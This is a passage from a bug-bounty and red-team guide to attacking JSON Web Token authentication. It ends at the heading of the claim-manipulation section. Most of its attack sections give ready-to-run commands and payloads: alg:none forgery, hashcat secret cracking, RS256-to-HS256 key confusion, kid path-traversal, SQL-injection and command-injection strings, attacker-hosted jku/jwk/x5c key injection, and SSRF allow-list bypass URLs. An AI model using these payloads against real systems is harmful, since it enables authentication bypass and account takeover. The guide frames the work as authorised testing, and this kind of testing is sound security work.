# JSON Web Token (JWT) — Complete In-Depth Testing Guide (Expert / Bug-Bounty & Red-Team Edition)

**Author:** x8bitranjit
**Scope:** JWT/JWS/JWE used for session auth, API auth, OAuth/OIDC `id_token`/`access_token`, password-reset & email-verification tokens, SSO assertions, microservice service-to-service tokens, mobile-app bearer tokens
**Platforms:** Windows + Kali/Linux commands provided for everything
**Companion files in this folder:**
- `JWT_ATTACK_ARSENAL.md` — copy-paste commands/payloads for every attack (alg:none, key confusion, kid/jku/jwk, cracking)
- `JWT_TESTING_CHECKLIST.md` — the testing-order checklist you tick through per token
- `JWT_REPORT_TEMPLATE.md` — the report skeleton that gets paid
- `poc/` — runnable scripts (JWKS server, alg:none forge, RS256→HS256, kid/jwk injection, HS256 cracking, generic forge)

> **Companion to the XSS & Android guides.** Same philosophy: *find* is Part I–III, *get paid* is Part IV–V. The recurring lesson — **report impact, not a condition** — applies hard here: "the JWT is signed with HS256" or "the token contains an email" is *not* a finding. The finding is **"I forged a valid admin token and took over any account."** A JWT bug that you can't turn into a forged-but-accepted token, a privilege jump, or an auth bypass is usually Informational. Read Part IV before you spend a day cracking secrets.

---

> ### ⚡ READ THIS FIRST — why most JWT reports get closed
> 1. **Decoding a JWT is not hacking it.** JWTs are *signed, not encrypted* (unless JWE). Anyone can base64url-decode the header/payload and read the claims — that's by design. "The JWT exposes the user's email/role" is **Informational** unless that data is a secret it shouldn't carry. The vuln is **forging a token the server accepts**, not reading one.
> 2. **The whole game is: does the server verify the signature correctly?** Every high-value JWT bug is a way to make the server accept a token *you* controlled the contents of — by disabling the signature (`alg:none`), confusing the algorithm (RS256→HS256), supplying your own key (`jwk`/`jku`/`kid`), or cracking a weak secret. If you can't change a claim and still be accepted, you don't have a bug yet.
> 3. **Change a claim → does anything happen?** The payday claims are `sub`/`user_id`/`uid` (→ IDOR/horizontal takeover), `role`/`isAdmin`/`scope`/`groups`/`tenant` (→ vertical priv-esc), `aud`/`iss` (→ cross-service reuse). Tamper one and watch the server's behavior.
> 4. **Lifecycle bugs are real bugs too.** `exp` not enforced, no revocation on logout, replayable (no `jti`), tokens accepted forever, refresh-token abuse — these are payable when they yield persistent access.
> 5. **Severity rides on what the forged token *does*, not on how clever the forge was.** A forged admin token = Critical. A forged token that changes nothing = nothing.
>
> **Where the money is (memorize this order):** ① **signature bypass that forges an admin/any-user token** (`alg:none`, RS256→HS256, weak-secret crack, `jwk`/`jku`/`kid` injection) → full ATO / vertical priv-esc → ② **claim tampering that the server trusts** (`sub`→other users = IDOR, `role`→admin) → ③ **`jku`/`x5u` SSRF** to attacker-hosted keys (sometimes also an SSRF finding on its own) → ④ **lifecycle failures** (no `exp`/no revocation/replay) yielding persistent or stolen-token access → ⑤ *then* info-leak claims, missing `typ`, and hardening notes as **Low/Info enablers**, not headliners.

---

## Table of Contents

**▶ [Master Testing Sequence — the testing order](#master-testing-sequence--the-testing-order)** — follow this top-to-bottom.

**PART I — FOUNDATIONS, RECON & BASELINE**
1. [Environment & Tooling Setup](#1-environment--tooling-setup)
2. [JWT Anatomy — Structure, Algorithms, Claims](#2-jwt-anatomy--structure-algorithms-claims)
3. [The Trust Model — How Verification Works & Where It Breaks](#3-the-trust-model--how-verification-works--where-it-breaks)
4. [Reconnaissance — Find, Decode & Map Every Token](#4-reconnaissance--find-decode--map-every-token)
5. [Baseline — Is the Signature Even Verified?](#5-baseline--is-the-signature-even-verified)

**PART II — SIGNATURE & KEY ATTACKS (work in this order)**
6. [`alg:none` / Unsigned-Token Acceptance](#6-algnone--unsigned-token-acceptance)
7. [Weak HMAC Secret Cracking (HS256/384/512)](#7-weak-hmac-secret-cracking)
8. [RS256 → HS256 Algorithm Confusion (Key Confusion)](#8-rs256--hs256-algorithm-confusion)
9. [Recovering the RSA Public Key When It's Not Published](#9-recovering-the-rsa-public-key)
10. [`kid` (Key ID) Injection — Path Traversal / SQLi / Command Injection](#10-kid-key-id-injection)
11. [`jku` / `x5u` Header Injection — Attacker-Hosted JWKS (SSRF)](#11-jku--x5u-header-injection)
12. [`jwk` Header Injection — Self-Signed Key Embedding](#12-jwk-header-injection)
13. [`x5c` Certificate-Chain Injection](#13-x5c-certificate-chain-injection)
14. [Algorithm-Specific Bugs (ES256 psychic signature, PS, EdDSA)](#14-algorithm-specific-bugs)

**PART III — CLAIM, LIFECYCLE & CONTEXT ATTACKS**
15. [Claim Manipulation — Priv-Esc & IDOR](#15-claim-manipulation--priv-esc--idor)
16. [Issuer / Audience Confusion & Cross-Service Reuse](#16-issuer--audience-confusion--cross-service-reuse)
17. [Expiration, Replay & Revocation Failures](#17-expiration-replay--revocation-failures)
18. [Refresh-Token & Session Lifecycle Abuse](#18-refresh-token--session-lifecycle-abuse)
19. [JWT Storage & Leakage](#19-jwt-storage--leakage)
20. [JWE / Nested / Encrypted-JWT Issues](#20-jwe--nested--encrypted-jwt-issues)
21. [Header-Injection & Parser Confusion](#21-header-injection--parser-confusion)

**PART IV — IMPACT (where the money is)**
22. [The Escalation Mindset](#22-the-escalation-mindset)
23. [Authentication Bypass & Full Account Takeover](#23-authentication-bypass--full-account-takeover)
24. [Horizontal Privilege Escalation (IDOR via `sub`)](#24-horizontal-privilege-escalation)
25. [Vertical Privilege Escalation (user → admin)](#25-vertical-privilege-escalation)
26. [Cross-Tenant / Multi-Tenant Compromise](#26-cross-tenant--multi-tenant-compromise)
27. [Chaining JWT with Other Bugs](#27-chaining-jwt-with-other-bugs)

**PART V — VALIDITY, SEVERITY & REPORTING (the bug-bounty layer)**
28. [The Validity-First Mindset for JWT](#28-the-validity-first-mindset-for-jwt)
29. [False Positives — STOP reporting these](#29-false-positives--stop-reporting-these-auto-reject-list)
30. [Severity Calibration](#30-severity-calibration--how-triagers-really-rate-jwt-bugs)
31. [Impact-Escalation Playbooks — "you found X, now do Y"](#31-impact-escalation-playbooks--you-found-x-now-do-y)
32. [Building a Professional, Safe PoC](#32-building-a-professional-safe-poc)
33. [Reporting, CWE/CVSS & De-duplication](#33-reporting-cwecvss--de-duplication)
34. [Automation & Scaling](#34-automation--scaling)
35. [Case Studies & Real-World Chains](#35-case-studies--real-world-chains)

**Appendices**
- [Appendix A — JWT Workflow Cheat Sheet](#appendix-a--jwt-workflow-cheat-sheet)
- [Appendix B — Attack Decision Tree](#appendix-b--attack-decision-tree)
- [Appendix C — Important Links](#appendix-c--important-links)

---

# Master Testing Sequence — The Testing Order

> **This is the spine of the whole guide.** Work it top-to-bottom. Each phase says *what to do*, *which § to open for detail*, and the *deliverable* that feeds the next phase. The numbered sections (1–35) are the reference detail; this sequence is the order you actually execute.

```
PHASE 0  AUTH & LAB         → confirm scope · build proxy+jwt_tool+Burp JWT Editor lab (§1) · stand up a JWKS host (§11)
PHASE 1  RECON & DECODE     → find EVERY token (cookie/header/URL/body) · decode header+payload · note alg, claims, kid/jku (§4)
PHASE 2  BASELINE  ★        → is the signature even checked? tamper payload, strip sig, swap alg (§5)
PHASE 3  SIGNATURE/KEY ⭐    → forge a token the server accepts:
                              alg:none (§6) · crack HS256 (§7) · RS256→HS256 (§8/§9) ·
                              kid inject (§10) · jku/x5u (§11) · jwk (§12) · x5c (§13) · alg bugs (§14)
PHASE 4  CLAIM/LIFECYCLE    → tamper sub/role/aud/iss (§15/§16) · test exp/replay/revocation (§17/§18) ·
                              storage leakage (§19) · JWE (§20) · parser confusion (§21)
PHASE 5  IMPACT  ⭐ (money)  → turn a forged/abused token into harm:
                              auth bypass/ATO (§23) · horizontal IDOR via sub (§24) · vertical user→admin (§25) ·
                              cross-tenant (§26) · chain with XSS/SSRF/OAuth (§27)
PHASE 6  VALIDATE → REPORT  → validity (§28) · false-positive filter (§29) · severity+CVSS+CWE (§30) ·
                              safe PoC (§32) · dedup (§33) · report template
```

**Phase-by-phase, with the deliverable that must exist before you move on:**

1. **PHASE 0 — Auth & lab.** Confirm scope (forging auth tokens is *active* testing — out-of-scope or against real users is invalid/illegal). Build the lab (**§1**): Burp + **JWT Editor** extension, `jwt_tool`, hashcat/john, a Python env, and (for §11–§13) **a public host you control** to serve a JWKS/cert. *Deliverable:* legal scope + working tooling + a reachable attacker-controlled HTTPS host.
2. **PHASE 1 — Recon & decode.** Find **every** token the app uses (session cookie, `Authorization: Bearer`, URL param, JSON body, OAuth `id_token`, reset-link token). Decode each header + payload; record `alg`, `kid`, `jku`/`x5u`/`jwk`/`x5c`, and every claim (**§4**). *Deliverable:* a token inventory with algorithms, claims, and where each is used.
3. **PHASE 2 — Baseline.** Before any clever attack, answer the one question that gates everything: **does the server verify the signature at all?** Tamper a claim *without* re-signing; strip the signature; flip the algorithm (**§5**). *Deliverable:* a yes/no on signature verification — if "no", you may already have the bug.
4. **PHASE 3 — Signature/key attacks ⭐.** Try, in order, to produce a **forged token the server accepts**: `alg:none` (**§6**), crack the HS256 secret (**§7**), RS256→HS256 confusion (**§8**, recovering the pubkey if needed **§9**), `kid` injection (**§10**), `jku`/`x5u` to your JWKS (**§11**), `jwk` self-key (**§12**), `x5c` (**§13**), algorithm-specific bugs (**§14**). *Deliverable:* a token with attacker-chosen claims that passes verification — or proof none of these work.
5. **PHASE 4 — Claim/lifecycle attacks.** With (or even without) a forge primitive, test what the server *trusts*: tamper `sub`/`role`/`aud`/`iss` (**§15/§16**); test `exp` enforcement, replay, logout revocation, refresh-token reuse (**§17/§18**); check storage/leakage (**§19**); JWE pitfalls (**§20**); parser confusion (**§21**). *Deliverable:* a list of claims the server trusts + any lifecycle failures.
6. **PHASE 5 — Impact ⭐ (where the money is).** Convert the above into demonstrable harm: authentication bypass / full ATO (**§23**), horizontal IDOR via `sub` (**§24**), vertical priv-esc to admin (**§25**), cross-tenant compromise (**§26**), or a chain (XSS→token theft, `jku`-SSRF, OAuth confusion) (**§27**). *Deliverable:* the payable impact (ATO, admin, cross-user/tenant data, persistent access).
7. **PHASE 6 — Validate → severity → report.** Apply the validity & false-positive filters (**§28/§29**), set a defensible CVSS/CWE (**§30**), build a clean *safe* PoC (**§32**), de-dup, and write it up (**§33**). *Deliverable:* the submitted report.

Reference anytime: commands → `JWT_ATTACK_ARSENAL.md`; checklist → `JWT_TESTING_CHECKLIST.md`; scripts → `poc/`; playbooks **§31**; case studies **§35**.

---

# PART I — FOUNDATIONS, RECON & BASELINE

# 1. Environment & Tooling Setup

## 1.1 Core toolchain

| Tool | Purpose | Get it |
|------|---------|--------|
| **jwt_tool** | Swiss-army knife: decode, tamper, all attacks (none/confusion/kid/jku/jwk), crack | https://github.com/ticarpi/jwt_tool |
| **Burp Suite + JWT Editor** | Intercept + sign/forge tokens inside Burp (none, key confusion, embed jwk) | https://portswigger.net/bappstore (JWT Editor by Fraser Winterborn) |
| **hashcat** | GPU crack HS256/384/512 secrets (`-m 16500`) | https://hashcat.net |
| **john (jumbo)** | CPU crack JWT (`--format=HMAC-SHA256`) | https://github.com/openwall/john |
| **jwt.io / token.dev** | Quick visual decode (offline copy preferred for secrets) | https://jwt.io |
| **Python + PyJWT / jwcrypto / cryptography** | Custom forging scripts (see `poc/`) | `pip install pyjwt cryptography jwcrypto` |
| **openssl** | Extract/convert public keys, build keys for confusion | bundled / https://openssl.org |
| **interactsh / Collaborator** | Catch `jku`/`x5u` SSRF callbacks | ProjectDiscovery / Burp |
| **RsaCtfTool / `jwt_forgery.py`** | Recover RSA public key (n,e) from 2 tokens (§9) | https://github.com/silentsignal/rsa_sign2n |
| **wordlists** | `jwt.secrets.list`, `rockyou.txt`, SecLists JWT secrets | https://github.com/wallarm/jwt-secrets, SecLists |

```powershell
# Windows (PowerShell)
git clone https://github.com/ticarpi/jwt_tool; cd jwt_tool; pip install -r requirements.txt
pip install pyjwt cryptography jwcrypto
# hashcat: download the binary release and add to PATH
# Burp → Extender → BApp Store → install "JWT Editor"
```
```bash
# Kali / Linux
sudo apt install -y hashcat john openssl
pipx install jwt_tool 2>/dev/null || git clone https://github.com/ticarpi/jwt_tool
pip3 install pyjwt cryptography jwcrypto
git clone https://github.com/silentsignal/rsa_sign2n   # public-key recovery (§9)
```

## 1.2 Stand up an attacker-controlled HTTPS host (do this in Phase 0)
`jku`, `x5u`, and some `kid` attacks require the server to fetch a key **from a URL you control**. Have this ready before testing:
- **Burp Collaborator / interactsh** gives you a unique HTTPS host that logs the fetch (proves SSRF even if the key isn't honored).
- To actually serve a spoofed JWKS, host `poc/jwks_server.py` on a public box (or expose localhost via `ngrok`/`cloudflared`). It serves a JWKS containing **your** public key so a token you signed with **your** private key verifies. See **§11**.

## 1.3 Two-account rule
As with every authz bug, keep **two test accounts** (a low-priv user and, ideally, a second user / an admin you control) so you can prove **cross-user** and **privilege** impact (`sub` swap, `role` bump). Forge into *your own* second account, never a real user's (**§32**).

## 1.4 Fingerprint before you attack (2 minutes that save hours)
```
□ Algorithm           → header.alg (HS* symmetric vs RS*/ES*/PS*/EdDSA asymmetric vs none)
□ kid present?        → header.kid (path/SQLi/command-injection surface, §10)
□ jku/x5u/jwk/x5c?    → header carries a key or key-URL → §11–§13 (high value)
□ Where used          → cookie? Authorization header? URL? OAuth id_token? reset token?
□ Issuer/JWKS         → is there a /.well-known/jwks.json or /.well-known/openid-configuration? (gets you the pubkey, §8/§9)
□ Claims of interest  → sub/uid, role/isAdmin/scope/groups, aud, iss, exp/iat/nbf, jti, tenant/org
□ Library hints       → typ, header field order, error messages (PyJWT/jose/jjwt/auth0) → known-CVE matching
```

---

# 2. JWT Anatomy — Structure, Algorithms, Claims

## 2.1 Structure
A JWS (the common "JWT") is three base64url parts joined by dots:
```
HEADER.PAYLOAD.SIGNATURE
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 . eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciJ9 . <sig>
└──── base64url(header) ───────────┘   └──── base64url(payload) ─────────┘
```
- **base64url** (not standard base64): `+`→`-`, `/`→`_`, padding `=` stripped. Decoding never needs a key.
- **JWE** (encrypted) has **five** parts (`header.encKey.iv.ciphertext.tag`) — different beast (**§20**).

```bash
# Decode without any tool (Linux):
echo 'eyJhbGciOiJIUzI1NiJ9' | tr '_-' '/+' | base64 -d 2>/dev/null
# Or just:
python3 -c "import jwt,sys;print(jwt.get_unverified_header(sys.argv[1]));print(jwt.decode(sys.argv[1],options={'verify_signature':False}))" <TOKEN>
```

## 2.2 Algorithms (this dictates the attack)

| `alg` | Type | Key | Primary attacks |
|-------|------|-----|-----------------|
| `none` | **unsigned** | — | accepted? → instant forge (**§6**) |
| `HS256/384/512` | symmetric HMAC | one shared **secret** | weak-secret crack (**§7**); confusion target (**§8**) |
| `RS256/384/512` | asymmetric RSA | private signs, **public** verifies | RS→HS confusion (**§8**), pubkey recovery (**§9**), jwk/jku/x5c (**§11–13**) |
| `ES256/384/512` | asymmetric ECDSA | EC private/public | "psychic signature" CVE-2022-21449 on Java (**§14**) |
| `PS256/384/512` | RSA-PSS | RSA private/public | same key-source attacks as RS* (**§11–13**) |
| `EdDSA` | Ed25519/448 | EdDSA keys | malleability/zero-key edge cases (**§14**) |

**The crucial asymmetric insight:** with RS256 the **public** key is, by definition, public. If the server can be tricked into treating it as an **HMAC secret** (§8) or into accepting **your** key (§11/§12), you can sign tokens it will trust.

## 2.3 Standard claims (RFC 7519) and what they're worth
```
sub   subject (the user id)         → swap → horizontal takeover/IDOR (§24)   ⭐
iss   issuer                         → confusion / cross-service reuse (§16)
aud   audience (intended recipient)  → confusion / token reuse across services (§16) ⭐
exp   expiry (epoch seconds)         → not enforced? replay/forever-token (§17)
nbf   not-before                     → bypass time gates
iat   issued-at
jti   unique id (replay defense)     → missing? replay (§17)
```
**Non-standard but high-value (app-specific):** `role`, `roles`, `isAdmin`, `admin`, `scope`, `scopes`, `permissions`, `groups`, `tenant`/`org`/`account_id`, `email`/`email_verified` (OAuth ATO), `amr`/`acr` (MFA level). These are the priv-esc claims — tamper them (§15, §25).

---

# 3. The Trust Model — How Verification Works & Where It Breaks

Correct verification is: *recompute/verify the signature over `header.payload` using the **expected** key and the **expected** algorithm, then validate the claims (`exp`, `aud`, `iss`, etc.).* Every JWT vuln is a break in one of those steps:

```
1. "Which algorithm?"   → if the server trusts header.alg, you pick it: none (§6) or HS where it expects RS (§8).
2. "Which key?"          → if the server takes the key from the TOKEN (jwk/jku/x5u/x5c/kid), you supply yours (§10–§13).
3. "Is the secret strong?"→ if HS* secret is guessable, you crack & re-sign (§7).
4. "Is the signature checked at all?" → some apps decode-only, never verify (§5).
5. "Are the claims validated?" → exp/aud/iss/nbf ignored → replay/reuse/forever (§16,§17).
6. "Is the token bound/revoked?" → no logout revocation, no device binding → stolen-token reuse (§18,§19).
```
> The mental model for the whole guide: **the attacker controls the entire token *before* the signature step.** Your job is to make the signature step either not happen, use the wrong algorithm, or use a key you control. Then every claim is yours.

---

# 4. Reconnaissance — Find, Decode & Map Every Token

Goal: a complete inventory of tokens, algorithms, claims, and key-source headers. Missing a token (e.g. the password-reset JWT) is missing the bug.

## 4.1 Find every token
```
□ Session / auth cookie            (decode cookie values — many are JWTs)
□ Authorization: Bearer <jwt>       (the API token)
□ X-Auth-Token / custom headers
□ URL query / fragment              (?token= / #id_token= — OAuth implicit, reset links) ← also a LEAK (§19)
□ Request/response JSON bodies      (access_token, refresh_token, id_token)
□ OAuth/OIDC                         id_token + access_token at the callback
□ Email/SMS links                    password-reset, email-verify, magic-login tokens (often JWT!) ← high value
□ WebSocket / mobile app traffic
```

## 4.2 Decode and record
```bash
# jwt_tool: decode + highlight interesting bits
python3 jwt_tool.py <TOKEN>

# Bulk: for every token, capture header.alg, kid, jku/x5u/jwk/x5c, and all claims
python3 -c "import jwt,sys,json;t=sys.argv[1];print('HEADER',jwt.get_unverified_header(t));print('CLAIMS',json.dumps(jwt.decode(t,options={'verify_signature':False}),indent=2))" <TOKEN>
```
Record for each token: **alg · kid · jku/x5u/jwk/x5c presence · sub · role/scope · aud · iss · exp/iat · jti · where-used**.

## 4.3 Grab the public key / JWKS (needed for §8, §9, §11)
```bash
# Most OAuth/OIDC issuers publish their keys — get them:
curl -s https://target.com/.well-known/openid-configuration | jq .
curl -s https://target.com/.well-known/jwks.json | jq .
curl -s https://target.com/jwks   https://target.com/oauth/jwks  ...
# If no JWKS endpoint, you may still recover the RSA public key from two tokens (§9),
# or extract it from the site's TLS certificate (sometimes the same key is reused).
```

---

# 5. Baseline — Is the Signature Even Verified?

**Always do this first.** A surprising number of apps decode the JWT and trust the claims **without verifying the signature** (misconfigured library, `verify=False`, "decode" used instead of "verify"). If so, you skip all the crypto and just edit claims.

## 5.1 The three baseline probes
```
A) TAMPER-NO-RESIGN: change a claim (e.g. role:user→admin) but KEEP the original signature.
   Accepted? → signature is NOT verified. Game over (Critical). Go straight to §15/§25.

B) STRIP SIGNATURE: keep header.payload, send an EMPTY third part ("header.payload.").
   Accepted? → server doesn't require a signature. (Often pairs with alg:none, §6.)

C) GARBAGE SIGNATURE: replace the signature with random bytes.
   Accepted? → not verified, or verification errors are swallowed.
```
```bash
# jwt_tool tamper mode walks you through editing claims and trying these:
python3 jwt_tool.py <TOKEN> -T
# Or the all-in-one "playbook" that runs the common checks:
python3 jwt_tool.py <TOKEN> -M pb     # probe-bypass / scan known issues against a live request
```

## 5.2 Important nuances
- Test against a request that **actually uses the token for authorization** (an authenticated endpoint that returns *your* data), not a public page that ignores it — otherwise "accepted" is meaningless.
- Differentiate **"accepted and acted on"** from "accepted but ignored": confirm the tampered claim changed behavior (e.g. you now see admin data). That's the difference between a finding and a false positive (**§29**).

> If baseline says the signature *is* verified, proceed to Part II to defeat the verification (none/confusion/key-injection/crack). If it's *not* verified, you've already found the highest-value bug — go to Part IV and demonstrate impact.

---

# PART II — SIGNATURE & KEY ATTACKS (work in this order)

> Goal of this part: produce **a token with attacker-chosen claims that the server accepts as valid.** Commands for each are in `JWT_ATTACK_ARSENAL.md`; runnable forgers are in `poc/`.

# 6. `alg:none` / Unsigned-Token Acceptance

The original JWT flaw: `alg:none` declares the token unsigned. If the server honors it, you forge any claims with **no key at all**.

## 6.1 The attack
```
1. Decode the token, set header.alg = "none" (also try case/whitespace variants — see filters below).
2. Edit the payload claims (role:admin, sub:<victim>, etc.).
3. Send header.payload with an EMPTY signature:   base64url(header).base64url(payload).
```
```bash
# jwt_tool — exploit alg:none (it tries none/None/NONE/nOnE):
python3 jwt_tool.py <TOKEN> -X a
# poc/alg_none.py builds it for you with custom claims (see poc/).
```

## 6.2 Filter-bypass variants (when "none" is blocklisted)
Many libraries blocklist the lowercase string `none`. Case/format tricks defeat naive checks:
```
none   None   NONE   nOnE   NonE   nonE
```
Also try `alg` with trailing space/null, or duplicate `alg` header keys (parser confusion, **§21**).

## 6.3 Validity & impact
- **Modern, patched libraries reject `none` by default** — so a *positive* here is increasingly a misconfiguration (someone allowed it) rather than a library bug. Either way it's a real, **Critical** finding *if the forged token is accepted on an authz-bearing request*.
- Don't report "alg:none is in the spec" — report **"the server accepted an unsigned token I forged, here is admin access."**

---

# 7. Weak HMAC Secret Cracking (HS256/384/512)

If the token uses HS* (symmetric), the **same secret signs and verifies**. A weak/guessable/default secret lets you re-sign arbitrary claims.

## 7.1 Crack it
```bash
# hashcat (GPU, fast) — mode 16500 = JWT
hashcat -a 0 -m 16500 token.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 16500 token.txt jwt.secrets.list   # wallarm/jwt-secrets + framework defaults

# john (CPU)
john token.txt --wordlist=rockyou.txt --format=HMAC-SHA256

# jwt_tool dictionary crack
python3 jwt_tool.py <TOKEN> -C -d jwt.secrets.list
```
- Prioritize **known-default secrets** first (`secret`, `your-256-bit-secret`, `changeme`, the framework's sample key, leaked `.env`/git secrets). Many real findings are literally `secret` or a tutorial's copy-pasted key.
- HS384/HS512 use modes `16700`/`16800` historically — check current hashcat mode list; jwt_tool handles all.

## 7.2 Forge with the cracked secret
```bash
# Re-sign tampered claims with the recovered secret:
python3 jwt_tool.py <TOKEN> -T -S hs256 -p "<cracked_secret>"
# or poc/forge_token.py --alg HS256 --secret <s> --claim role=admin
```

## 7.3 Validity & impact
- A cracked secret = **you can mint any token = full auth bypass / ATO / admin**. Critical.
- "HS256 is theoretically weaker than RS256" with **no cracked secret** is **not a finding** (§29). You must actually recover the key and forge.

---

# 8. RS256 → HS256 Algorithm Confusion

The classic asymmetric-to-symmetric confusion. The server expects **RS256** (verifies with the RSA *public* key). If you change the token's `alg` to **HS256** and the server naively uses **the same public key bytes as the HMAC secret**, you can sign tokens with the **public key** — which you have.

## 8.1 Why it works
- RS256 verify: `RSA_verify(publicKey, data, sig)`.
- HS256 verify: `HMAC_SHA256(secret, data) == sig`.
- A vulnerable server picks the key by *its own* config but the **algorithm from the token**. So it computes `HMAC(publicKey, data)` and compares — and **you can compute that too**, because the public key is public.

## 8.2 The attack
```
1. Obtain the RSA PUBLIC key (PEM). From JWKS/OIDC (§4.3), the site cert, or recover it (§9).
2. Set header.alg = HS256. Edit claims.
3. HMAC-SHA256 sign header.payload using the EXACT public-key PEM bytes as the secret.
   (Match formatting precisely: PEM with/without trailing newline both matter — try both.)
```
```bash
# jwt_tool key-confusion exploit (give it the public key):
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
# poc/rs256_to_hs256.py automates: it tries PEM with/without trailing newline + DER variants.
# Burp JWT Editor: "Sign" → algorithm HS256 → paste the PEM as the symmetric key.
```

## 8.3 Validity & impact
- A working RS→HS confusion = **mint any token** = Critical (auth bypass / ATO / admin).
- **Key-formatting is the usual snag**: the secret must be the *exact* bytes the server uses (PEM text vs DER, with/without trailing `\n`, X.509 SubjectPublicKeyInfo vs PKCS#1). `poc/rs256_to_hs256.py` brute-forces these variants for you.

---

# 9. Recovering the RSA Public Key When It's Not Published

For §8 you need the RSA public key. If there's no JWKS endpoint, you can often **recover (n, e)** from **two different tokens** signed by the same key (using `rsa_sign2n`/`jwt_forgery.py`), or pull it from the TLS certificate if reused.

```bash
# silentsignal/rsa_sign2n — recover candidate public keys from 2 captured RS256 tokens:
cd rsa_sign2n/standalone
python3 jwt_forgery.py <TOKEN_1> <TOKEN_2>
# It outputs candidate public keys (PEM) AND ready-made HS256-confusion tokens to try.

# If the app reuses the TLS key for signing (rare but happens), extract it from the cert:
openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -pubkey -noout > tls_pub.pem
```
> This turns "RS256 with no published key" (which people assume is safe) into a confusion attack. Capture two valid tokens first (e.g. log in twice), then recover and feed the key into §8.

---

# 10. `kid` (Key ID) Injection

The `kid` header tells the server **which key** to load. If the server uses `kid` to build a **file path**, **DB lookup**, or **command**, it's an injection sink — and you may steer it to a key whose value you know.

## 10.1 Path traversal → predictable-key signing
```
kid points to a file the server reads as the key. Point it at a file with KNOWN/empty content:
  "kid": "../../../../dev/null"        → key = empty → sign with empty string secret
  "kid": "/dev/null"                   → empty key
  "kid": "../../../../etc/hostname"    → key = file content you can read elsewhere
```
```bash
# jwt_tool kid-traversal helper:
python3 jwt_tool.py <TOKEN> -X i        # injection scan
# Manual: set kid=../../../../dev/null, alg=HS256, sign with secret="" :
python3 poc/kid_injection.py --kid "../../../../dev/null" --secret "" --claim role=admin <TOKEN>
```
- The `/dev/null` trick is gold: the server loads an **empty** key, so HMAC with secret `""` verifies. Forge freely.

## 10.2 `kid` SQL injection
If `kid` indexes a database (`SELECT key FROM keys WHERE id='<kid>'`), inject to **return a key you control**:
```sql
kid:  nonexistent' UNION SELECT 'attackerKnownSecret' --
```
Then sign HS256 with `attackerKnownSecret`. Also test for classic SQLi impact in `kid` (data exfil).

## 10.3 `kid` command/LFI injection
If `kid` reaches an OS command or file read, test command injection / LFI (`kid: "key; id"`, `kid: "|whoami"`). This can be **RCE** independent of the JWT.

> **Why `kid` pays:** it's a single header field that can be path-traversal, SQLi, *and* command-injection — three high-severity classes — plus it enables forging. Always fuzz it.

---

# 11. `jku` / `x5u` Header Injection — Attacker-Hosted JWKS (SSRF)

`jku` (JWK Set URL) and `x5u` (X.509 URL) tell the server **where to fetch the verification key**. If the server fetches the URL from the **token** without strictly allow-listing the host, you point it at **your** JWKS containing **your** public key, then sign with **your** private key.

## 11.1 The attack
```
1. Generate your own RSA keypair.
2. Host a JWKS at a URL you control containing your PUBLIC key (with a chosen kid).
3. Set header.jku = https://YOUR-HOST/jwks.json  (matching kid), alg=RS256, edit claims.
4. Sign with your PRIVATE key. Server fetches your JWKS, "verifies" → accepts.
```
```bash
# poc/jwks_server.py generates a keypair, serves /jwks.json, and prints a forging command.
python3 poc/jwks_server.py            # then expose via ngrok/cloudflared or run on a public box
# jwt_tool jku exploit:
python3 jwt_tool.py <TOKEN> -X s -ju https://YOUR-HOST/jwks.json -pr private.pem
```

## 11.2 Bypassing host allow-lists
If the server checks that `jku`'s host matches the issuer, try the usual SSRF-style allow-list bypasses:
```
https://trusted.com@YOUR-HOST/jwks.json
https://trusted.com.YOUR-HOST/jwks.json
https://YOUR-HOST/jwks.json#trusted.com
https://YOUR-HOST/jwks.json?x=trusted.com
https://trusted.com/redirect?url=https://YOUR-HOST/jwks.json   (open redirect on the trusted host)
```
Use an **HTML/JSON injection or open redirect on the trusted domain** to host your JWKS path if the host must match.

## 11.3 Two findings in one
- Even if the spoofed key isn't honored, the server **fetching your URL** is **SSRF** — confirm with a Collaborator/interactsh callback (it may reach internal metadata, §27). Report SSRF *and* the auth bypass if you get both.

---

# 12. `jwk` Header Injection — Self-Signed Key Embedding

The `jwk` header can **embed the public key directly in the token**. If the server verifies against the **embedded** key instead of its own trusted key, you simply include **your** public key and sign with **your** private key — no hosting needed.

```
1. Generate your RSA keypair.
2. Put your PUBLIC key in header.jwk (JSON Web Key form), alg=RS256, edit claims.
3. Sign with your PRIVATE key. Vulnerable server trusts the embedded key → accepts.
```
```bash
# Burp JWT Editor: "Attack" → "Embedded JWK" (one click).
# jwt_tool:
python3 jwt_tool.py <TOKEN> -X i        # also covers embedded-jwk injection
# poc/jwk_inject.py builds a token with your generated public key embedded.
```
> This is the easiest key-injection attack to *try* (no hosting), so test it early in Phase 3. A server that honors `jwk`/`jku`/`x5c` from the token is fully forgeable → **Critical**.

---

# 13. `x5c` Certificate-Chain Injection

`x5c` carries an X.509 cert chain in the header. If the server extracts the public key from `x5c` and verifies with it (without validating the chain against a trusted CA / pinned cert), you embed a **self-signed cert** whose key you control and sign with its private key.

```bash
# Generate a self-signed cert, put its DER in x5c, sign with its key:
openssl req -x509 -newkey rsa:2048 -keyout x5c.key -out x5c.crt -days 7 -nodes -subj "/CN=poc"
# poc/jwk_inject.py --x5c x5c.crt --key x5c.key --claim role=admin <TOKEN>
```
Validate whether the server checks the chain to a trusted root; if not, it's the same forge primitive as `jwk`.

---

# 14. Algorithm-Specific Bugs

## 14.1 ES256 "psychic signature" (CVE-2022-21449, Java)
Vulnerable Java versions (15–18) accept an **ECDSA signature of (r=0, s=0)** as valid — i.e. a blank signature passes. If the target verifies ES256 on affected Java, you forge any token with an all-zero signature.
```bash
# jwt_tool covers it; or craft a token with r=s=0:
python3 jwt_tool.py <TOKEN> -X psychic   # (recent jwt_tool); else build (0,0) DER signature manually
```

## 14.2 PS256 / EdDSA
- **PS256** = RSA-PSS: same **key-source** attacks as RS* (`jwk`/`jku`/`x5c`, §11–§13) and confusion if downgradeable.
- **EdDSA**: watch for libraries accepting a zero/identity public key or malleable signatures; rarer, but test forge primitives.

## 14.3 Algorithm downgrade / substitution
Try swapping `alg` to any other supported algorithm and see if verification is mismatched (e.g. RS512→RS256, PS→RS, ES→HS). Any acceptance of a token signed differently than expected is a confusion bug.

---

# PART III — CLAIM, LIFECYCLE & CONTEXT ATTACKS

# 15. Claim Manipulation — Priv-Esc & IDOR

